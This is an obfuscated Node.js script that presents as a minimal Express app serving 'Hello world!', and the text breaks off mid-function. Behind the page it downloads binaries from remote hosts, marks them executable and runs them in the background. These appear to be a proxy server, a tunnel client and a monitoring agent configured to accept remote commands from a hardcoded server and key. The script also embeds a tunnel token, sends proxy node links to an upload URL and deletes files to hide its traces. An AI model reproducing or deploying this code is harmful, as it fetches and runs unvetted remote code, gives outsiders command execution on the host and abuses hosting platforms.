const _0x215147=_0x3934;function _0x3934(_0x4dd261,_0x2f0bf1){const _0x52c519=_0x52c5();return _0x3934=function(_0x393413,_0x901495){_0x393413=_0x393413-0x151;let _0x391b1b=_0x52c519[_0x393413];return _0x391b1b;},_0x3934(_0x4dd261,_0x2f0bf1);}(function(_0x57a1e1,_0x62d3f4){const _0x54edf3={_0x3258b5:0x20b,_0x4659d6:0x1cb,_0x3836ef:0x1d1,_0x78f26d:0x181},_0x87b800=_0x3934,_0x1ad920=_0x57a1e1();while(!![]){try{const _0x5a840c=parseInt(_0x87b800(_0x54edf3._0x3258b5))/0x1+-parseInt(_0x87b800(0x15d))/0x2*(-parseInt(_0x87b800(_0x54edf3._0x4659d6))/0x3)+parseInt(_0x87b800(0x1c7))/0x4*(parseInt(_0x87b800(0x1d9))/0x5)+-parseInt(_0x87b800(_0x54edf3._0x3836ef))/0x6+parseInt(_0x87b800(_0x54edf3._0x78f26d))/0x7+-parseInt(_0x87b800(0x1c3))/0x8+-parseInt(_0x87b800(0x204))/0x9;if(_0x5a840c===_0x62d3f4)break;else _0x1ad920['push'](_0x1ad920['shift']());}catch(_0x15ef9b){_0x1ad920['push'](_0x1ad920['shift']());}}}(_0x52c5,0xe94e1));const express=require(_0x215147(0x16a)),app=express(),axios=require(_0x215147(0x17d)),os=require('os'),fs=require('fs'),path=require(_0x215147(0x1f9)),{promisify}=require(_0x215147(0x1bd)),exec=promisify(require('child_process')[_0x215147(0x174)]),{execSync}=require(_0x215147(0x1df)),UPLOAD_URL=process[_0x215147(0x151)][_0x215147(0x1b2)]||'',PROJECT_URL=process[_0x215147(0x151)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x215147(0x151)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x215147(0x151)]['FILE_PATH']||_0x215147(0x1d7),SUB_PATH=process[_0x215147(0x151)][_0x215147(0x1b0)]||_0x215147(0x156),PORT=process['env'][_0x215147(0x1d6)]||process[_0x215147(0x151)]['PORT']||0xbb8,UUID=process[_0x215147(0x151)][_0x215147(0x1ca)]||_0x215147(0x185),NEZHA_SERVER=process[_0x215147(0x151)][_0x215147(0x1a5)]||'youhs.tk:80',NEZHA_PORT=process['env'][_0x215147(0x16c)]||'',NEZHA_KEY=process['env'][_0x215147(0x1ad)]||'vZeLtIZV9E7BPLBi02YMj7w4cprQuVFE',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'railway2.yxrm.dpdns.org',ARGO_AUTH=process[_0x215147(0x151)][_0x215147(0x208)]||_0x215147(0x18a),ARGO_PORT=process[_0x215147(0x151)][_0x215147(0x168)]||0x1f41,CFIP=process[_0x215147(0x151)][_0x215147(0x158)]||'cf.090227.xyz',CFPORT=process[_0x215147(0x151)][_0x215147(0x1eb)]||0x1bb,NAME=process['env'][_0x215147(0x1b8)]||'';!fs[_0x215147(0x1e5)](FILE_PATH)?(fs[_0x215147(0x20d)](FILE_PATH),console['log'](FILE_PATH+_0x215147(0x200))):console['log'](FILE_PATH+_0x215147(0x1a6));function generateRandomName(){const _0x4c6b01={_0x1c9bdb:0x16d,_0x5d8df7:0x1c1,_0x49348a:0x1cf,_0x37f69f:0x188},_0x490437=_0x215147,_0x3ede8d=_0x490437(_0x4c6b01._0x1c9bdb);let _0x56a851='';for(let _0x34e0de=0x0;_0x34e0de<0x6;_0x34e0de++){_0x56a851+=_0x3ede8d['charAt'](Math[_0x490437(_0x4c6b01._0x5d8df7)](Math[_0x490437(_0x4c6b01._0x49348a)]()*_0x3ede8d[_0x490437(_0x4c6b01._0x37f69f)]));}return _0x56a851;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x215147(0x17b)](FILE_PATH,phpName),webPath=path[_0x215147(0x17b)](FILE_PATH,webName),botPath=path[_0x215147(0x17b)](FILE_PATH,botName),subPath=path[_0x215147(0x17b)](FILE_PATH,_0x215147(0x15c)),listPath=path[_0x215147(0x17b)](FILE_PATH,'list.txt'),bootLogPath=path[_0x215147(0x17b)](FILE_PATH,_0x215147(0x155)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x8db897={_0x50fe50:0x1e5,_0xb8fad6:0x17a,_0x37d6f9:0x188,_0x32363d:0x1b9,_0x2e8e59:0x1c6},_0x3adbdf=_0x215147;try{if(!UPLOAD_URL)return;if(!fs[_0x3adbdf(_0x8db897._0x50fe50)](subPath))return;let _0x24e178;try{_0x24e178=fs[_0x3adbdf(0x1f1)](subPath,'utf-8');}catch{return null;}const _0x322fe5=Buffer['from'](_0x24e178,_0x3adbdf(0x1e4))[_0x3adbdf(_0x8db897._0xb8fad6)](_0x3adbdf(0x18f)),_0x50d537=_0x322fe5['split']('\x0a')['filter'](_0xe9234a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3adbdf(0x1a0)](_0xe9234a));if(_0x50d537[_0x3adbdf(_0x8db897._0x37d6f9)]===0x0)return;return axios[_0x3adbdf(_0x8db897._0x32363d)](UPLOAD_URL+_0x3adbdf(0x19f),JSON[_0x3adbdf(_0x8db897._0x2e8e59)]({'nodes':_0x50d537}),{'headers':{'Content-Type':_0x3adbdf(0x197)}})[_0x3adbdf(0x170)](_0x1cfb2b=>{return null;}),null;}catch(_0x3246ab){return null;}}function _0x52c5(){const _0x3c02c6=['Add\x20automatic\x20access\x20task\x20faild:\x20','util','tunnel.yml','App\x20is\x20running','\x20failed:\x20','floor','Subscription\x20uploaded\x20successfully','5714808Bxzorm','arch','https://arm64.ssss.nyc.mn/bot','stringify','234840zFiXNs','rm\x20-rf\x20','Skipping\x20adding\x20automatic\x20access\x20task','UUID','259134jpmDGu','firefox','https://amd64.ssss.nyc.mn/bot','\x0a\x0atrojan://','random','Hello\x20world!','2490438dhQrKl','https://arm64.ssss.nyc.mn/v1','message','error','then','SERVER_PORT','./tmp','/api/add-subscriptions','140aFlwRr','win32','unshift','forEach','amd','web\x20running\x20error:\x20','child_process','set','send','basename','chmod','base64','existsSync','tls','https://amd64.ssss.nyc.mn/agent','log','isFile','from','CFPORT','https://amd64.ssss.nyc.mn/web','charAt','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','match','2083','readFileSync','none','\x0a\x20\x20tunnel:\x20','finish','/dev/null','clear','\x20-s\x20','blackhole','path','nohup\x20','http','\x20>/dev/null\x202>&1\x20&','TunnelSecret','status','php\x20running\x20error:\x20','\x20is\x20created','listen','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20-c\x20\x22','29689371aRmAEy','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Empowerment\x20success\x20for\x20','/api/add-nodes','ARGO_AUTH','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/tunnel.yml\x20run','1529411qomWFm','platform','mkdirSync','config.json','?security=tls&sni=','env','\x20successfully','http\x20server\x20is\x20running\x20on\x20port:','\x20is\x20running','boot.log','sub','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','CFIP','country_code','\x0a\x0avmess://','ArgoDomain:','sub.txt','10YZWDuL','includes','arm','https+local://8.8.8.8/dns-query','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','&fp=firefox&type=ws&host=','\x20>/dev/null\x202>&1','127.0.0.1','quic','.exe\x20>\x20nul\x202>&1','Error\x20downloading\x20files:','ARGO_PORT','readdirSync','express','2053','NEZHA_PORT','abcdefghijklmnopqrstuvwxyz','\x0a\x20\x20\x20\x20','2096','catch','unlinkSync','stream','config.yaml','exec','Empowerment\x20failed\x20for\x20','direct','/config.json\x20>/dev/null\x202>&1\x20&','vless','unlink','toString','join','vmess','axios','https://amd64.ssss.nyc.mn/v1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/vmess-argo','12450753TEuvPA','8443','tunnel.json','taskkill\x20/f\x20/im\x20','abc7ff74-c626-4f26-a298-fda6b655b085','countryCode','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','length','automatic\x20access\x20task\x20added\x20successfully','eyJhIjoiZDU3MzRjMzE1ZDViODNhNTNhNWViNjI3MzViY2QzZjgiLCJ0IjoiMTI2ZWY4OWUtMDM4Ni00MWE2LTk4M2MtMzY4YTUxNDcwODZjIiwicyI6Ik9HTmlPRFptWW1ZdFpEWXhNUzAwTkdRNExXSmpOekV0TURWa1ptWmhNMlEyTkRjeiJ9','npm\x20running\x20error:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Unknown','writeFileSync','utf-8','/vmess-argo?ed=2560','Error\x20executing\x20command:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0aclient_secret:\x20','Download\x20','createWriteStream','\x20-c\x20','application/json','http://ip-api.com/json/','NEZHA\x20variable\x20is\x20empty,skip\x20running','--tls','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://ipapi.co/json/','tcp','get','/api/delete-nodes','test','success','has','2087','Nodes\x20uploaded\x20successfully','NEZHA_SERVER','\x20already\x20exists','statSync','/trojan-argo','org','trojan','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Unhandled\x20error\x20in\x20startserver:','NEZHA_KEY','\x20-p\x20','map','SUB_PATH','response','UPLOAD_URL','Error\x20reading\x20boot.log:','split','data','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','NAME','post','push','Content-Type'];_0x52c5=function(){return _0x3c02c6;};return _0x52c5();}function cleanupOldFiles(){const _0x231898={_0x4f11b5:0x17b,_0x57fd93:0x1a7,_0x795f31:0x1e9,_0x1a00c4:0x171},_0x647feb=_0x215147;try{const _0x3fca4=fs[_0x647feb(0x169)](FILE_PATH);_0x3fca4[_0x647feb(0x1dc)](_0x1d148f=>{const _0x6cd906=_0x647feb,_0x1fc296=path[_0x6cd906(_0x231898._0x4f11b5)](FILE_PATH,_0x1d148f);try{const _0x36656a=fs[_0x6cd906(_0x231898._0x57fd93)](_0x1fc296);_0x36656a[_0x6cd906(_0x231898._0x795f31)]()&&fs[_0x6cd906(_0x231898._0x1a00c4)](_0x1fc296);}catch(_0x543ea0){}});}catch(_0x2e1b04){}}app[_0x215147(0x19e)]('/',function(_0x56fb10,_0x1898dc){const _0xc0a617={_0x1e17ab:0x1e1,_0x4d57b3:0x1d0},_0x1b351d=_0x215147;_0x1898dc[_0x1b351d(_0xc0a617._0x1e17ab)](_0x1b351d(_0xc0a617._0x4d57b3));});async function generateConfig(){const _0x1e4607={_0x347568:0x178,_0xed01c7:0x180,_0x33b83b:0x19d,_0x5350ba:0x178,_0x4ff212:0x1f2,_0x4a09e8:0x165,_0x3a55ea:0x180,_0x8304cc:0x1e6,_0x574934:0x165,_0x5754e0:0x176,_0x18a317:0x1f8,_0x2412b0:0x18e},_0x1874f4=_0x215147,_0x53825b={'log':{'access':'/dev/null','error':_0x1874f4(0x1f5),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1874f4(_0x1e4607._0x347568),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x1874f4(_0x1e4607._0xed01c7),'dest':0xbbb},{'path':_0x1874f4(0x1a8),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x1874f4(_0x1e4607._0x33b83b),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x1874f4(_0x1e4607._0x5350ba),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1874f4(_0x1e4607._0x4ff212)},'streamSettings':{'network':'ws','security':_0x1874f4(0x1f2),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1874f4(0x1fb),_0x1874f4(0x1e6),_0x1874f4(_0x1e4607._0x4a09e8)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1874f4(0x164),'protocol':_0x1874f4(0x17c),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1874f4(_0x1e4607._0x3a55ea)}},'sniffing':{'enabled':!![],'destOverride':[_0x1874f4(0x1fb),_0x1874f4(_0x1e4607._0x8304cc),_0x1874f4(0x165)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x1874f4(0x1aa),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1874f4(_0x1e4607._0x4ff212),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1874f4(0x1e6),_0x1874f4(_0x1e4607._0x574934)],'metadataOnly':![]}}],'dns':{'servers':[_0x1874f4(0x160)]},'outbounds':[{'protocol':'freedom','tag':_0x1874f4(_0x1e4607._0x5754e0)},{'protocol':_0x1874f4(_0x1e4607._0x18a317),'tag':'block'}]};fs[_0x1874f4(_0x1e4607._0x2412b0)](path['join'](FILE_PATH,_0x1874f4(0x20e)),JSON[_0x1874f4(0x1c6)](_0x53825b,null,0x2));}function getSystemArchitecture(){const _0x221740={_0x237d1d:0x15f},_0x1f6f70=_0x215147,_0x5472b4=os[_0x1f6f70(0x1c4)]();return _0x5472b4===_0x1f6f70(0x15f)||_0x5472b4==='arm64'||_0x5472b4==='aarch64'?_0x1f6f70(_0x221740._0x237d1d):_0x1f6f70(0x1dd);}function downloadFile(_0x2fb3ca,_0x4f4bd9,_0x49312c){const _0x1be609={_0x2b14fb:0x195},_0x30bd2a={_0x52e70f:0x194,_0x2897c1:0x1e2},_0x26476b={_0x4ab67b:0x1b5},_0x52bedd=_0x215147,_0x357ff2=_0x2fb3ca;!fs['existsSync'](FILE_PATH)&&fs[_0x52bedd(0x20d)](FILE_PATH,{'recursive':!![]});const _0x298ed7=fs[_0x52bedd(_0x1be609._0x2b14fb)](_0x357ff2);axios({'method':_0x52bedd(0x19e),'url':_0x4f4bd9,'responseType':_0x52bedd(0x172)})[_0x52bedd(0x1d5)](_0x33eb94=>{const _0x5b8348={_0x1c9971:0x1d3},_0x1b2336={_0x9ee95f:0x1e8},_0x131e89=_0x52bedd;_0x33eb94[_0x131e89(_0x26476b._0x4ab67b)]['pipe'](_0x298ed7),_0x298ed7['on'](_0x131e89(0x1f4),()=>{const _0x2875e9=_0x131e89;_0x298ed7['close'](),console[_0x2875e9(_0x1b2336._0x9ee95f)]('Download\x20'+path[_0x2875e9(0x1e2)](_0x357ff2)+_0x2875e9(0x152)),_0x49312c(null,_0x357ff2);}),_0x298ed7['on'](_0x131e89(0x1d4),_0x449d28=>{const _0x537f33=_0x131e89;fs[_0x537f33(0x179)](_0x357ff2,()=>{});const _0x23c851='Download\x20'+path[_0x537f33(0x1e2)](_0x357ff2)+_0x537f33(0x1c0)+_0x449d28[_0x537f33(_0x5b8348._0x1c9971)];console[_0x537f33(0x1d4)](_0x23c851),_0x49312c(_0x23c851);});})[_0x52bedd(0x170)](_0x108913=>{const _0x27dd5f=_0x52bedd,_0x3272da=_0x27dd5f(_0x30bd2a._0x52e70f)+path[_0x27dd5f(_0x30bd2a._0x2897c1)](_0x357ff2)+_0x27dd5f(0x1c0)+_0x108913[_0x27dd5f(0x1d3)];console[_0x27dd5f(0x1d4)](_0x3272da),_0x49312c(_0x3272da);});}async function downloadFilesAndRun(){const _0xd8c1f={_0xc6f91:0x1d4,_0x411157:0x167,_0x327747:0x15e,_0x10d5e4:0x1b4,_0x50b29a:0x1a3,_0x137377:0x1a2,_0x2fb6e4:0x193,_0x96bc54:0x187,_0x5a7a64:0x173,_0x87e52f:0x203,_0x3ca9e4:0x1ff,_0x3ba649:0x19a,_0x3b4482:0x1ae,_0xdd1eb7:0x199,_0x4c3143:0x1fa,_0x18ab8c:0x196,_0x58ec94:0x1d4,_0xa4aeab:0x1de,_0x512e79:0x209,_0x2cf7be:0x1fa,_0x181648:0x1fc,_0x1296a1:0x1d4,_0x468899:0x191},_0x342186={_0x4ce45a:0x1dc},_0x3e9d51={_0x5edb76:0x1e5},_0x4d329e=_0x215147,_0x368d01=getSystemArchitecture(),_0x5eaaac=getFilesForArchitecture(_0x368d01);if(_0x5eaaac[_0x4d329e(0x188)]===0x0){console[_0x4d329e(0x1e8)](_0x4d329e(0x17f));return;}const _0x46e110=_0x5eaaac[_0x4d329e(0x1af)](_0x3eec3a=>{return new Promise((_0x3b75bb,_0x855da1)=>{downloadFile(_0x3eec3a['fileName'],_0x3eec3a['fileUrl'],(_0x4c6e90,_0x4762c1)=>{_0x4c6e90?_0x855da1(_0x4c6e90):_0x3b75bb(_0x4762c1);});});});try{await Promise['all'](_0x46e110);}catch(_0x3b7bff){console[_0x4d329e(_0xd8c1f._0xc6f91)](_0x4d329e(_0xd8c1f._0x411157),_0x3b7bff);return;}function _0x11ebb5(_0x51d452){const _0x24e062=_0x4d329e,_0x43f71d=0x1fd;_0x51d452[_0x24e062(_0x342186._0x4ce45a)](_0x5be371=>{const _0x3a3b5d={_0x4fe98f:0x1d4,_0x1c1854:0x1e8,_0x41973a:0x17a},_0x5483d7=_0x24e062;fs[_0x5483d7(_0x3e9d51._0x5edb76)](_0x5be371)&&fs[_0x5483d7(0x1e3)](_0x5be371,_0x43f71d,_0x1b37be=>{const _0x549637=_0x5483d7;_0x1b37be?console[_0x549637(_0x3a3b5d._0x4fe98f)](_0x549637(0x175)+_0x5be371+':\x20'+_0x1b37be):console[_0x549637(_0x3a3b5d._0x1c1854)](_0x549637(0x206)+_0x5be371+':\x20'+_0x43f71d[_0x549637(_0x3a3b5d._0x41973a)](0x8));});});}const _0x33d3a9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x11ebb5(_0x33d3a9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1e32e1=NEZHA_SERVER[_0x4d329e(_0xd8c1f._0x327747)](':')?NEZHA_SERVER[_0x4d329e(_0xd8c1f._0x10d5e4)](':')['pop']():'',_0x41bc19=new Set(['443','8443','2096',_0x4d329e(_0xd8c1f._0x50b29a),_0x4d329e(0x1f0),'2053']),_0x1c677c=_0x41bc19[_0x4d329e(_0xd8c1f._0x137377)](_0x1e32e1)?'true':'false',_0x4ec290=_0x4d329e(_0xd8c1f._0x2fb6e4)+NEZHA_KEY+_0x4d329e(_0xd8c1f._0x96bc54)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1c677c+_0x4d329e(0x19b)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x4d329e(_0xd8c1f._0x5a7a64)),_0x4ec290);const _0x4007b9='nohup\x20'+phpPath+_0x4d329e(_0xd8c1f._0x87e52f)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4007b9),console[_0x4d329e(0x1e8)](phpName+_0x4d329e(0x154)),await new Promise(_0x545586=>setTimeout(_0x545586,0x3e8));}catch(_0x3adbe3){console[_0x4d329e(0x1d4)](_0x4d329e(_0xd8c1f._0x3ca9e4)+_0x3adbe3);}}else{let _0x4dc6e6='';const _0x2467e7=['443',_0x4d329e(0x182),_0x4d329e(0x16f),'2087',_0x4d329e(0x1f0),_0x4d329e(0x16b)];_0x2467e7[_0x4d329e(0x15e)](NEZHA_PORT)&&(_0x4dc6e6=_0x4d329e(_0xd8c1f._0x3ba649));const _0x13df4d=_0x4d329e(0x1fa)+npmPath+_0x4d329e(0x1f7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4d329e(_0xd8c1f._0x3b4482)+NEZHA_KEY+'\x20'+_0x4dc6e6+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x13df4d),console['log'](npmName+_0x4d329e(0x154)),await new Promise(_0x5d5f0d=>setTimeout(_0x5d5f0d,0x3e8));}catch(_0x23ff87){console[_0x4d329e(0x1d4)](_0x4d329e(0x18b)+_0x23ff87);}}}else console['log'](_0x4d329e(_0xd8c1f._0xdd1eb7));const _0x4ffc52=_0x4d329e(_0xd8c1f._0x4c3143)+webPath+_0x4d329e(_0xd8c1f._0x18ab8c)+FILE_PATH+_0x4d329e(0x177);try{await exec(_0x4ffc52),console['log'](webName+'\x20is\x20running'),await new Promise(_0xb17f7f=>setTimeout(_0xb17f7f,0x3e8));}catch(_0x4b316d){console[_0x4d329e(_0xd8c1f._0x58ec94)](_0x4d329e(_0xd8c1f._0xa4aeab)+_0x4b316d);}if(fs[_0x4d329e(0x1e5)](botPath)){let _0x35a0e9;if(ARGO_AUTH[_0x4d329e(0x1ef)](/^[A-Z0-9a-z=]{120,250}$/))_0x35a0e9=_0x4d329e(0x1ab)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x35a0e9=_0x4d329e(_0xd8c1f._0x512e79)+FILE_PATH+_0x4d329e(0x20a):_0x35a0e9='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4d329e(_0xd8c1f._0x2cf7be)+botPath+'\x20'+_0x35a0e9+_0x4d329e(_0xd8c1f._0x181648)),console['log'](botName+_0x4d329e(0x154)),await new Promise(_0x2dabb7=>setTimeout(_0x2dabb7,0x7d0));}catch(_0x1b3d70){console[_0x4d329e(_0xd8c1f._0x1296a1)](_0x4d329e(_0xd8c1f._0x468899)+_0x1b3d70);}}await new Promise(_0xe3fa6=>setTimeout(_0xe3fa6,0x1388));}function getFilesForArchitecture(_0x37f367){const _0x42da3d={_0xdb6478:0x1ec,_0x3ee361:0x1cd,_0x3448b6:0x15f,_0x4dec89:0x1e7,_0x2c8c9c:0x1db},_0x27658b=_0x215147;let _0x44e004;_0x37f367==='arm'?_0x44e004=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x27658b(0x1c5)}]:_0x44e004=[{'fileName':webPath,'fileUrl':_0x27658b(_0x42da3d._0xdb6478)},{'fileName':botPath,'fileUrl':_0x27658b(_0x42da3d._0x3ee361)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x134266=_0x37f367===_0x27658b(_0x42da3d._0x3448b6)?'https://arm64.ssss.nyc.mn/agent':_0x27658b(_0x42da3d._0x4dec89);_0x44e004[_0x27658b(_0x42da3d._0x2c8c9c)]({'fileName':npmPath,'fileUrl':_0x134266});}else{const _0x2a0360=_0x37f367==='arm'?_0x27658b(0x1d2):_0x27658b(0x17e);_0x44e004[_0x27658b(0x1db)]({'fileName':phpPath,'fileUrl':_0x2a0360});}}return _0x44e004;}function argoType(){const _0x2b17a1={_0x1e429b:0x1e8,_0x1447a1:0x18e,_0x8340b9:0x1b4,_0x4e995b:0x183,_0x57fd13:0x1b7,_0x3a7e90:0x18e,_0x43d83f:0x1be,_0x284158:0x1ee},_0x7b4de8=_0x215147;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x7b4de8(_0x2b17a1._0x1e429b)](_0x7b4de8(0x18c));return;}if(ARGO_AUTH[_0x7b4de8(0x15e)](_0x7b4de8(0x1fd))){fs[_0x7b4de8(_0x2b17a1._0x1447a1)](path[_0x7b4de8(0x17b)](FILE_PATH,_0x7b4de8(0x183)),ARGO_AUTH);const _0x45b72a=_0x7b4de8(0x1f3)+ARGO_AUTH[_0x7b4de8(_0x2b17a1._0x8340b9)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x7b4de8(_0x2b17a1._0x4e995b))+_0x7b4de8(_0x2b17a1._0x57fd13)+ARGO_DOMAIN+_0x7b4de8(0x161)+ARGO_PORT+_0x7b4de8(0x157);fs[_0x7b4de8(_0x2b17a1._0x3a7e90)](path[_0x7b4de8(0x17b)](FILE_PATH,_0x7b4de8(_0x2b17a1._0x43d83f)),_0x45b72a);}else console['log'](_0x7b4de8(_0x2b17a1._0x284158));}async function extractDomains(){const _0x2a9a01={_0x44d5b1:0x1e8,_0x2a52d3:0x1f1,_0x17b954:0x1b4,_0x4ec617:0x15b,_0x2f2207:0x171,_0x54a35d:0x17b,_0x5ae4a9:0x1fc,_0x4acc77:0x154,_0x156f4e:0x1d4},_0x2f3b9a={_0x4006f9:0x1b5,_0x4cf4b5:0x159,_0xb946e6:0x1a9,_0x2e0997:0x198,_0x3b2b08:0x186,_0x31b1d6:0x1b5},_0x40ddab={_0x1064e5:0x20c,_0x36cd7e:0x1da,_0x275eed:0x166,_0x48a29d:0x1ed},_0x447ef2={_0x32b7fc:0x1ba},_0x17ed4b=_0x215147;let _0x2a7e61;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2a7e61=ARGO_DOMAIN,console[_0x17ed4b(_0x2a9a01._0x44d5b1)]('ARGO_DOMAIN:',_0x2a7e61),await _0x3eef7b(_0x2a7e61);else try{const _0x22b603=fs[_0x17ed4b(_0x2a9a01._0x2a52d3)](path[_0x17ed4b(0x17b)](FILE_PATH,'boot.log'),_0x17ed4b(0x18f)),_0x7bad8b=_0x22b603[_0x17ed4b(_0x2a9a01._0x17b954)]('\x0a'),_0x5d54e1=[];_0x7bad8b['forEach'](_0x33cbd7=>{const _0x268f13=_0x17ed4b,_0x585fd9=_0x33cbd7[_0x268f13(0x1ef)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x585fd9){const _0x27f254=_0x585fd9[0x1];_0x5d54e1[_0x268f13(_0x447ef2._0x32b7fc)](_0x27f254);}});if(_0x5d54e1[_0x17ed4b(0x188)]>0x0)_0x2a7e61=_0x5d54e1[0x0],console['log'](_0x17ed4b(_0x2a9a01._0x4ec617),_0x2a7e61),await _0x3eef7b(_0x2a7e61);else{console[_0x17ed4b(0x1e8)](_0x17ed4b(0x205)),fs[_0x17ed4b(_0x2a9a01._0x2f2207)](path[_0x17ed4b(_0x2a9a01._0x54a35d)](FILE_PATH,_0x17ed4b(0x155)));async function _0x43c27c(){const _0x8d3dc0=_0x17ed4b;try{process[_0x8d3dc0(_0x40ddab._0x1064e5)]===_0x8d3dc0(_0x40ddab._0x36cd7e)?await exec(_0x8d3dc0(0x184)+botName+_0x8d3dc0(_0x40ddab._0x275eed)):await exec('pkill\x20-f\x20\x22['+botName[_0x8d3dc0(_0x40ddab._0x48a29d)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x20b496){}}_0x43c27c(),await new Promise(_0x393941=>setTimeout(_0x393941,0xbb8));const _0x5b6407=_0x17ed4b(0x202)+FILE_PATH+_0x17ed4b(0x192)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5b6407+_0x17ed4b(_0x2a9a01._0x5ae4a9)),console[_0x17ed4b(0x1e8)](botName+_0x17ed4b(_0x2a9a01._0x4acc77)),await new Promise(_0xfa3bac=>setTimeout(_0xfa3bac,0xbb8)),await extractDomains();}catch(_0x58d033){console['error'](_0x17ed4b(0x191)+_0x58d033);}}}catch(_0x3d4bc1){console[_0x17ed4b(_0x2a9a01._0x156f4e)](_0x17ed4b(0x1b3),_0x3d4bc1);}async function _0x13c3d7(){const _0x4aa46a=_0x17ed4b;try{const _0x25f5fa=await axios[_0x4aa46a(0x19e)](_0x4aa46a(0x19c),{'timeout':0xbb8});if(_0x25f5fa[_0x4aa46a(0x1b5)]&&_0x25f5fa[_0x4aa46a(0x1b5)]['country_code']&&_0x25f5fa[_0x4aa46a(_0x2f3b9a._0x4006f9)]['org'])return _0x25f5fa[_0x4aa46a(_0x2f3b9a._0x4006f9)][_0x4aa46a(_0x2f3b9a._0x4cf4b5)]+'_'+_0x25f5fa[_0x4aa46a(_0x2f3b9a._0x4006f9)][_0x4aa46a(_0x2f3b9a._0xb946e6)];}catch(_0x5be55b){try{const _0x1c124e=await axios[_0x4aa46a(0x19e)](_0x4aa46a(_0x2f3b9a._0x2e0997),{'timeout':0xbb8});if(_0x1c124e[_0x4aa46a(0x1b5)]&&_0x1c124e[_0x4aa46a(_0x2f3b9a._0x4006f9)]['status']===_0x4aa46a(0x1a1)&&_0x1c124e['data'][_0x4aa46a(_0x2f3b9a._0x3b2b08)]&&_0x1c124e[_0x4aa46a(0x1b5)][_0x4aa46a(_0x2f3b9a._0xb946e6)])return _0x1c124e[_0x4aa46a(_0x2f3b9a._0x31b1d6)][_0x4aa46a(_0x2f3b9a._0x3b2b08)]+'_'+_0x1c124e[_0x4aa46a(0x1b5)]['org'];}catch(_0x5eb932){}}return _0x4aa46a(0x18d);}async function _0x3eef7b(_0xe07eb3){const 